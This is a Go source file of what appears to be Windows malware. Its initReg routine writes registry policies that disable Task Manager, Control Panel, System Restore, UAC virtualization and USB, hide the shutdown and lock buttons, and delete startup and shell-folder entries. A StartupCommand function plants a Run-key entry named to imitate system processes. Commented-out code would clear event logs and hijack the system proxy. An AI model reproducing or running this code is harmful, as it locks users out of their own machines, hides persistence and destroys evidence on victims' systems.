package main

import (
	"errors"
	"fmt"
	"golang.org/x/sys/windows/registry"
	"io"
	"math/rand"
	"strings"
)

func initReg() int {
	var errorCount int
	handleError := func(err error) {
		if err != nil {
			errorCount++
		}
	}

	actions := []func() error{
		DisableTaskManager,
		DisableControlPanel,
		DisableSystemRestore,
		HideFastUserSwitching,
		//DisableAutoLogger,
		//ClearSystemLogs,
		DisableNoWinKeys,
		RemoveNecessaryButtons,
		DisableAllowEndTask,
		HideDesktopIcons,
		RemovePaths,
		RemoveStartups,
		//MessWithInternet,
		DisableVirtualization,
		//DisableWifi,
		DisableUSBConnection,
	}

	for _, action := range actions {
		handleError(action())
	}

	return errorCount
}

func DisableDefragmentation() error {
	// "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" DisableRegistryTools 1
	key, err := registry.OpenKey(
		registry.CURRENT_USER,
		`SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`,
		registry.QUERY_VALUE|registry.SET_VALUE,
	)
	if err != nil {
		return err
	}
	defer func(key registry.Key) {
		_ = key.Close()
	}(key)
	return key.SetDWordValue("DisableRegistryTools", 1)
}

func DisableTaskManager() error {
	// "Both\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" DisableTaskMgr 1
	key, err := registry.OpenKey(
		registry.CURRENT_USER,
		`Software\Microsoft\Windows\CurrentVersion\Policies\System`,
		registry.QUERY_VALUE|registry.SET_VALUE,
	)
	if err == nil {
		defer func(key registry.Key) {
			_ = key.Close()
		}(key)
		_ = key.SetDWordValue("DisableTaskMgr", 1)
	}

	key2, err := registry.OpenKey(
		registry.LOCAL_MACHINE,
		`SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`,
		registry.QUERY_VALUE|registry.SET_VALUE,
	)
	if err == nil {
		defer func(key2 registry.Key) {
			_ = key2.Close()
		}(key2)
		_ = key2.SetDWordValue("DisableTaskMgr", 1)
	}

	return err
}

func DisableControlPanel() error {
	// "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" NoControlPanel 1
	key, err := registry.OpenKey(
		registry.CURRENT_USER,
		`Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`,
		registry.QUERY_VALUE|registry.SET_VALUE,
	)
	if err != nil {
		return err
	}
	defer func(key registry.Key) {
		_ = key.Close()
	}(key)

	return key.SetDWordValue("NoControlPanel", 1)
}

func DisableSystemRestore() error {
	// "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore" DisableSR 1
	key, err := registry.OpenKey(
		registry.LOCAL_MACHINE,
		`SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore`,
		registry.QUERY_VALUE|registry.SET_VALUE,
	)
	if err != nil {
		return err
	}
	defer func(key registry.Key) {
		_ = key.Close()
	}(key)
	return key.SetDWordValue("DisableSR", 1)
}

func HideFastUserSwitching() error {
	// "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" HideFastUserSwitching 1
	key, err := registry.OpenKey(
		registry.LOCAL_MACHINE,
		`SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`,
		registry.QUERY_VALUE|registry.SET_VALUE,
	)
	if err != nil {
		return err
	}
	defer func(key registry.Key) {
		_ = key.Close()
	}(key)
	return key.SetDWordValue("HideFastUserSwitching", 1)
}

//func DisableAutoLogger() error {
//	advapi32, err := syscall.LoadLibrary("advapi32.dll")
//	if err != nil {
//		return err
//	}
//	defer func(handle syscall.Handle) {
//		_ = syscall.FreeLibrary(handle)
//	}(advapi32)
//
//	proc, err := syscall.GetProcAddress(advapi32, "RegisterEventSourceW")
//	if err != nil {
//		return err
//	}
//
//	_, _, callErr := syscall.SyscallN(proc, 2, 0, 0, 0)
//	if callErr != 0 {
//		return callErr
//	}
//
//	return nil
//}
//
//func ClearSystemLogs() error {
//	advapi32, err := syscall.LoadLibrary("advapi32.dll")
//	if err != nil {
//		return err
//	}
//	defer func(handle syscall.Handle) {
//		_ = syscall.FreeLibrary(handle)
//	}(advapi32)
//
//	proc, err := syscall.GetProcAddress(advapi32, "ClearEventLogW")
//	if err != nil {
//		return err
//	}
//
//	_, _, callErr := syscall.SyscallN(proc, 2, uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr("Application"))), 0, 0)
//	if callErr != 0 {
//		return callErr
//	}
//
//	_, _, callErr = syscall.SyscallN(proc, 2, uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr("System"))), 0, 0)
//	if callErr != 0 {
//		return callErr
//	}
//
//	return nil
//}

func DisableNoWinKeys() error {
	// "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" NoWinKeys 1
	key, err := registry.OpenKey(
		registry.CURRENT_USER,
		`Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`,
		registry.QUERY_VALUE|registry.SET_VALUE,
	)
	if err != nil {
		return err
	}
	defer func(key registry.Key) {
		_ = key.Close()
	}(key)
	return key.SetDWordValue("NoWinKeys", 1)
}

func RemoveNecessaryButtons() error {
	keyPath := `SOFTWARE\Microsoft\PolicyManager\default\Start`

	setDWordValue := func(key registry.Key, valueName string) {
		defer func(key registry.Key) {
			_ = key.Close()
		}(key)

		_ = key.SetDWordValue(valueName, 1)
	}

	keys := []string{"HideShutDown", "HideSleep", "HideHibernate", "HideRestart", "HideLock", "HideSwitchAccount", "HidePowerButton", "HideAppList", "HideSignOuts", "NoPinningToTaskbar"}

	for _, k := range keys {
		key, err := registry.OpenKey(registry.LOCAL_MACHINE, keyPath+"\\"+k, registry.QUERY_VALUE|registry.SET_VALUE)
		if err != nil {
			continue
		}
		setDWordValue(key, "value")
	}

	return nil
}

func DisableAllowEndTask() error {
	// "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PolicyManager\default\TaskManager\AllowEndTask" 0
	key, err := registry.OpenKey(
		registry.LOCAL_MACHINE,
		`SOFTWARE\Microsoft\PolicyManager\default\TaskManager\AllowEndTask`,
		registry.QUERY_VALUE|registry.SET_VALUE,
	)
	if err != nil {
		return err
	}
	defer func(key registry.Key) {
		_ = key.Close()
	}(key)
	return key.SetDWordValue("value", 0)
}

func SetFilePaths(path string) error {
	key, err := registry.OpenKey(
		registry.LOCAL_MACHINE,
		`SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths`,
		registry.QUERY_VALUE|registry.SET_VALUE,
	)
	if err != nil {
		return err
	}
	defer func(key registry.Key) {
		_ = key.Close()
	}(key)

	subkeys, err := key.ReadSubKeyNames(10000)
	if err != nil && !errors.Is(err, io.EOF) {
		return err
	}

	for _, subkey := range subkeys {
		_ = key.SetStringValue(subkey, path)
	}

	return nil
}

//func SetRunPaths(path string) error {
//	// "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run"
//	key, err := registry.OpenKey(
//		registry.CURRENT_USER,
//		`Software\Microsoft\Windows\CurrentVersion\Run`,
//		registry.QUERY_VALUE|registry.SET_VALUE,
//	)
//	if err != nil {
//		return err
//	}
//
//
//}

func HideDesktopIcons() error {
	// "Computer\\HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced" HideIcons 1
	key, err := registry.OpenKey(
		registry.CURRENT_USER,
		`Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced`,
		registry.QUERY_VALUE|registry.SET_VALUE,
	)
	if err != nil {
		return err
	}

	defer func(key registry.Key) {
		_ = key.Close()
	}(key)

	return key.SetDWordValue("HideIcons", 1)
}

func RemovePaths() error {
	// "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders"
	key, err := registry.OpenKey(
		registry.CURRENT_USER,
		`Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`,
		registry.QUERY_VALUE|registry.SET_VALUE,
	)
	if err != nil {
		return err
	}

	defer func(key registry.Key) {
		_ = key.Close()
	}(key)

	names, err := key.ReadValueNames(10000)
	if err != nil && !errors.Is(err, io.EOF) {
		return err
	}

	for _, name := range names {
		_ = key.DeleteValue(name)
	}

	return nil
}

func RemoveStartups() error {
	// "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run"
	key, err := registry.OpenKey(
		registry.LOCAL_MACHINE,
		`SOFTWARE\Microsoft\Windows\CurrentVersion\Run`,
		registry.QUERY_VALUE|registry.SET_VALUE,
	)
	if err != nil {
		return err
	}

	defer func(key registry.Key) {
		_ = key.Close()
	}(key)

	names, err := key.ReadValueNames(10000)
	if err != nil && !errors.Is(err, io.EOF) {
		return err
	}

	for _, name := range names {
		_ = key.DeleteValue(name)
	}

	return nil
}

func StartupCommand(command string) error {
	systemFileNames := []string{
		"Serivce Host",
		"System interrupts",
		"wsappx",
		"Services and Controller app",
		"Secure System",
	}

	if strings.HasPrefix(command, "cmd") {
		command = fmt.Sprintf("C:\\Windows\\system32\\cmd.exe /C %s", command)
	}

	spaces := strings.Repeat(" ", rand.Intn(9)+1)
	randomIndex := rand.Intn(len(systemFileNames))
	name := fmt.Sprintf("%s%s", systemFileNames[randomIndex], spaces)

	key, err := registry.OpenKey(
		registry.LOCAL_MACHINE,
		`SOFTWARE\Microsoft\Windows\CurrentVersion\Run`,
		registry.SET_VALUE,
	)
	if err != nil {
		return err
	}
	defer func(key registry.Key) {
		_ = key.Close()
	}(key)
	return key.SetExpandStringValue(name, command)
}

func MessWithInternet() error {
	// "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
	key, err := registry.OpenKey(
		registry.CURRENT_USER,
		`Software\Microsoft\Windows\CurrentVersion\Internet Settings`,
		registry.QUERY_VALUE|registry.SET_VALUE,
	)
	if err != nil {
		return err
	}

	defer func(key registry.Key) {
		_ = key.Close()
	}(key)

	err = key.SetDWordValue("ProxyEnable", 1)
	if err != nil {
		return err
	}

	// set "ProxyServer" value to "1.2.3.4"
	err = key.SetStringValue("ProxyServer", "1.2.3.4:2222")
	if err != nil {
		return err
	}

	// set "ProxyOverride" to ""
	err = key.SetStringValue("ProxyOverride", "")
	if err != nil {
		return err
	}

	return nil
}

func DisableVirtualization() error {
	key, err := registry.OpenKey(
		registry.LOCAL_MACHINE,
		`SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`,
		registry.QUERY_VALUE|registry.SET_VALUE,
	)
	if err != nil {
		return err
	}

	defer func(key registry.Key) {
		_ = key.Close()
	}(key)

	return key.SetDWordValue("EnableVirtualization", 0)
}

func DeleteAdapters() error {
	// "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer"
	key, err := registry.OpenKey(
		registry.LOCAL_MACHINE,
		`SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer`,
		registry.QUERY_VALUE|registry.SET_VALUE,
	)
	if err != nil {
		return err
	}

	defer func(key registry.Key) {
		_ = key.Close()
	}(key)

	// get subkeys
	subkeys, err := key.ReadValueNames(10000)
	if err != nil && !errors.Is(err, io.EOF) {
		return err
	}

	for _, subkey := range subkeys {
		_ = key.DeleteValue(subkey)
	}

	return nil
}

func DisableWifi() error {
	// "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PolicyManager\default\Wifi\AllowWiFi"
	key, err := registry.OpenKey(
		registry.LOCAL_MACHINE,
		`SOFTWARE\Microsoft\PolicyManager\default\Wifi\AllowWiFi`,
		registry.QUERY_VALUE|registry.SET_VALUE,
	)
	if err != nil {
		return err
	}

	defer func(key registry.Key) {
		_ = key.Close()
	}(key)

	return key.SetDWordValue("Value", 0)
}

func DisableUSBConnection() error {
	// "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PolicyManager\default\Connectivity\AllowUSBConnection"
	key, err := registry.OpenKey(
		registry.LOCAL_MACHINE,
		`SOFTWARE\Microsoft\PolicyManager\default\Connectivity\AllowUSBConnection`,
		registry.QUERY_VALUE|registry.SET_VALUE,
	)
	if err != nil {
		return err
	}

	defer func(key registry.Key) {
		_ = key.Close()
	}(key)

	return key.SetDWordValue("Value", 0)
}
